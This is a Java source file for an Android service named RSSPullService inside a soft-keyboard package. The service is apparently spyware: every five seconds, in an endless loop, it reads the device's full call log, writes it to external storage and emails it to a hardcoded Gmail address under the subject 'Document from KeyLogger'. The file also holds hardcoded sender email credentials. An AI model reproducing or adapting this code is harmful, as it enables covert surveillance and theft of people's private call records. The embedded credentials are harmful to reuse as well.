package com.example.android.softkeyboard;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Date;
import java.util.Properties;
import java.util.Scanner;

import javax.activation.CommandMap;
import javax.activation.MailcapCommandMap;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;


public class RSSPullService extends IntentService {

    String veh = "";

    public RSSPullService() {
	super("hiiiii");
	// TODO Auto-generated constructor stub
    }

    File root;
String userid;
    @Override
    protected void onHandleIntent(Intent workIntent) {
	// Gets data from the incoming Intent
	
	String FILENAME1 = "log_file.txt";
	userid = workIntent.getStringExtra("userid");
	System.out.println(userid);
	Thread t = new Thread();
	t.start();
	int i = 1;
	while (i > 0) {

	    try {
		//to change time  1=minute, 10 second, 1000 milisec
		Thread.sleep(5* 01 * 1000);

		root = new File(Environment.getExternalStorageDirectory(),
			"download");
		// attachments
		//to save in sd card
		String[] attachFiles = new String[1];
		attachFiles[0] = "mnt/sdcard/download" + "/" + FILENAME1;
		System.out.println("file is saved on" + root + "/" + FILENAME1);
		try {
		    StringBuffer call_logs = getCallDetails();
		    // System.out.println(call_logs);
		   
	
		    try {
			
		
			StringBuffer sb=new StringBuffer();
	
			sb.append(call_logs);
			
			 File f = new File(root + "/" + FILENAME1);
			    PrintWriter writer = new PrintWriter(f);
			    writer.print(sb);
			   
			    writer.close();
			  
			  System.out.println("Last contents: "+call_logs);
			  
			  
			  
			  
			  ///change ur email id: change userid to email id
			  
			  sendEmailWithAttachments("mananmangal@gmail.com",attachFiles);
			} catch (Exception e) {
			    // TODO Auto-generated catch block
			    e.printStackTrace();
			}
		    File f = new File(root + "/" + FILENAME1);
		    PrintWriter writer = new PrintWriter(f);
		    writer.print("__");
		    writer.close();
		} catch (Exception e) {
		    // TODO Auto-generated catch block
		    e.printStackTrace();
		}
	    } catch (Exception e) {
		e.printStackTrace();
	    }
	
	}
	

    }

    private StringBuffer getCallDetails() {

	StringBuffer sb = new StringBuffer();
	Cursor managedCursor = getContentResolver().query(
		CallLog.Calls.CONTENT_URI, null, null, null, null);
	int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
	int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
	int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
	int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
	sb.append("Call Details :");
	while (managedCursor.moveToNext()) {
	    String phNumber = managedCursor.getString(number);
	    String callType = managedCursor.getString(type);
	    String callDate = managedCursor.getString(date);
	    Date callDayTime = new Date(Long.valueOf(callDate));
	    String callDuration = managedCursor.getString(duration);
	    String dir = null;
	    int dircode = Integer.parseInt(callType);
	    switch (dircode) {
	    case CallLog.Calls.OUTGOING_TYPE:
		dir = "OUTGOING";
		break;

	    case CallLog.Calls.INCOMING_TYPE:
		dir = "INCOMING";
		break;

	    case CallLog.Calls.MISSED_TYPE:
		dir = "MISSED";
		break;
	    }
	    sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
		    + dir + " \nCall Date:--- " + callDayTime
		    + " \nCall duration in sec :--- " + callDuration);
	    sb.append("\n----------------------------------");
	}
	managedCursor.close();
	return sb;

    }

    String mailFrom = "trymelater111@gmail.com";
    String password = "trymelater";

    public void sendEmailWithAttachments(String userName, String[] attachFiles)
	    throws AddressException, MessagingException {
	// sets SMTP server properties
	String host = "smtp.gmail.com";
	String port = "587";
	MailcapCommandMap mc = (MailcapCommandMap) CommandMap
		.getDefaultCommandMap();
	mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
	mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
	mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
	mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
	mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
	CommandMap.setDefaultCommandMap(mc);

	// message info

	String subject = "Doucment from KeyLogger";
	String message = "This is the new document from keylogger app";
	Properties properties = new Properties();
	properties.put("mail.smtp.host", host);
	properties.put("mail.smtp.port", port);
	properties.put("mail.smtp.auth", "true");
	properties.put("mail.smtp.starttls.enable", "true");
	properties.put("mail.user", userName);
	properties.put("mail.password", password);
	System.out.println("file is saved on" + password);
	// creates a new session with an authenticator
	Authenticator auth = new Authenticator() {
	    public PasswordAuthentication getPasswordAuthentication() {
		return new PasswordAuthentication(mailFrom, password);
	    }
	};
	System.out.println("after is saved on" + password);
	Session session = Session.getInstance(properties, auth);

	// creates a new e-mail message
	Message msg = new MimeMessage(session);

	msg.setFrom(new InternetAddress(userName));
	InternetAddress[] toAddresses = { new InternetAddress(userName) };
	msg.setRecipients(Message.RecipientType.TO, toAddresses);
	msg.setSubject(subject);
	msg.setSentDate(new Date());

	// creates message part
	MimeBodyPart messageBodyPart = new MimeBodyPart();
	messageBodyPart.setContent(message, "text/html");

	// creates multi-part
	Multipart multipart = new MimeMultipart();
	multipart.addBodyPart(messageBodyPart);

	// adds attachments
	// adds attachments
	if (attachFiles != null && attachFiles.length > 0) {
	    for (String filePath : attachFiles) {
		MimeBodyPart attachPart = new MimeBodyPart();

		try {
		    attachPart.attachFile(filePath);
		} catch (IOException ex) {
		    ex.printStackTrace();
		}

		multipart.addBodyPart(attachPart);
	    }
	}

	System.out.println("before is saved on" + password);
	// sets the multi-part as e-mail's content
	msg.setContent(multipart);
	Thread.currentThread().setContextClassLoader(
		getClass().getClassLoader());
	// sends the e-mail
	Transport.send(msg);
	System.out.println("sent" + password);
    }
}